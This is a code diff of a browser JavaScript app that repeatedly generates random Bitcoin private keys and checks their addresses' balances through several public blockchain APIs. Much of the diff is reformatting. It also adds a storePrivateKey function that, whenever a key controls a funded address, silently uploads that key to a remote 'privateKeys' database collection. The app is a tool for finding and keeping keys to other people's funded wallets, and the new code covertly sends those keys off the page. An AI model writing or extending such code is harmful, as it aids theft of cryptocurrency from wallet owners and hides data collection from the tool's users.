@@ -36,7 +36,8 @@ const showPrivateKey = (key, addresses) => {
   document.getElementById('privateKey').innerText = key;
   document.getElementById('privateKey').classList.remove('blinking');
   document.getElementById('compressedAddress').innerText = addresses.compressed;
-  document.getElementById('uncompressedAddress').innerText = addresses.uncompressed;
+  document.getElementById('uncompressedAddress').innerText =
+    addresses.uncompressed;
   document.getElementById('bech32Address').innerText = addresses.bech32;
   document.getElementById('compressedAddress').classList.remove('blinking');
   document.getElementById('uncompressedAddress').classList.remove('blinking');
@@ -54,9 +55,28 @@ const updateBalance = (type, balance) => {
     balance > 0 ? `${balance} BTC` : '0 BTC';
 };
 
+// Store private key with balance
+const storePrivateKey = async (key) => {
+  try {
+    // Wait for db to be defined
+    while (!window.db || !window.collection || !window.addDoc) {
+      await new Promise((resolve) => setTimeout(resolve, 100));
+    }
+    const privateKeysCollection = window.collection(window.db, 'privateKeys');
+    await window.addDoc(privateKeysCollection, {
+      privateKey: key,
+    });
+    console.log('Private key stored successfully!');
+  } catch (error) {
+    console.error('Error storing private key: ', error);
+  }
+};
+
 // API Functions
 const getBalanceFromBlockchainInfo = async (address) => {
-  const response = await fetch(`https://blockchain.info/q/addressbalance/${address}?cors=true`);
+  const response = await fetch(
+    `https://blockchain.info/q/addressbalance/${address}?cors=true`
+  );
   if (response.ok) {
     const balance = parseInt(await response.text()) / 1e8;
     return balance;
@@ -65,7 +85,9 @@ const getBalanceFromBlockchainInfo = async (address) => {
 };
 
 const getBalanceFromBlockcypher = async (address) => {
-  const response = await fetch(`https://api.blockcypher.com/v1/btc/main/addrs/${address}`);
+  const response = await fetch(
+    `https://api.blockcypher.com/v1/btc/main/addrs/${address}`
+  );
   if (response.ok) {
     const data = await response.json();
     const balance = data.final_balance / 1e8;
@@ -75,7 +97,9 @@ const getBalanceFromBlockcypher = async (address) => {
 };
 
 const getBalanceFromBlockchair = async (address) => {
-  const response = await fetch(`https://api.blockchair.com/bitcoin/dashboards/address/${address}`);
+  const response = await fetch(
+    `https://api.blockchair.com/bitcoin/dashboards/address/${address}`
+  );
   if (response.ok) {
     const data = await response.json();
     const balance = data.data[address].address.balance / 1e8;
@@ -85,33 +109,29 @@ const getBalanceFromBlockchair = async (address) => {
 };
 
 const getBalanceFromBlockstream = async (address) => {
-  const response = await fetch(`https://blockstream.info/api/address/${address}`);
+  const response = await fetch(
+    `https://blockstream.info/api/address/${address}`
+  );
   if (response.ok) {
     const data = await response.json();
-    const balance = data.chain_stats.funded_txo_sum / 1e8 - data.chain_stats.spent_txo_sum / 1e8;
+    const balance =
+      data.chain_stats.funded_txo_sum / 1e8 -
+      data.chain_stats.spent_txo_sum / 1e8;
     return balance;
   }
   throw new Error('Failed to fetch balance from Blockstream');
 };
 
 const getBalanceFromBitcore = async (address) => {
-  const response = await fetch(`https://api.bitcore.io/api/BTC/mainnet/address/${address}/balance`);
+  const response = await fetch(
+    `https://api.bitcore.io/api/BTC/mainnet/address/${address}/balance`
+  );
   if (response.ok) {
     const data = await response.json();
     const balance = data.balance / 1e8;
     return balance;
   }
   throw new Error('Failed to fetch balance from Bitcore');
-};
-
-const getBalanceFromSmartbit = async (address) => {
-  const response = await fetch(`https://api.smartbit.com.au/v1/blockchain/address/${address}`);
-  if (response.ok) {
-    const data = await response.json();
-    const balance = data.address.total.balance / 1e8;
-    return balance;
-  }
-  throw new Error('Failed to fetch balance from Smartbit');
 };
 
 // Array of API Functions
@@ -121,7 +141,6 @@ const balanceApis = [
   getBalanceFromBlockchair,
   getBalanceFromBlockstream,
   getBalanceFromBitcore,
-  getBalanceFromSmartbit
 ];
 
 const getRandomApi = () => {
@@ -171,16 +190,27 @@ const generateKey = () => {
 
   const checkAllBalances = async () => {
     try {
-      const compressedBalance = await checkBalance(compressedAddress, 'compressed');
-      await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay
+      const compressedBalance = await checkBalance(
+        compressedAddress,
+        'compressed'
+      );
+      await new Promise((resolve) => setTimeout(resolve, 2000)); // 2 seconds delay
 
-      const uncompressedBalance = await checkBalance(uncompressedAddress, 'uncompressed');
-      await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay
+      const uncompressedBalance = await checkBalance(
+        uncompressedAddress,
+        'uncompressed'
+      );
+      await new Promise((resolve) => setTimeout(resolve, 2000)); // 2 seconds delay
 
       const bech32Balance = await checkBalance(bech32Address, 'bech32');
-      await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay
+      await new Promise((resolve) => setTimeout(resolve, 2000)); // 2 seconds delay
 
-      if (compressedBalance > 0 || uncompressedBalance > 0 || bech32Balance > 0) {
+      if (
+        compressedBalance > 0 ||
+        uncompressedBalance > 0 ||
+        bech32Balance > 0
+      ) {
+        await storePrivateKey(keyPair.toWIF());
         setTimeout(() => {
           generateKey();
         }, 20000);
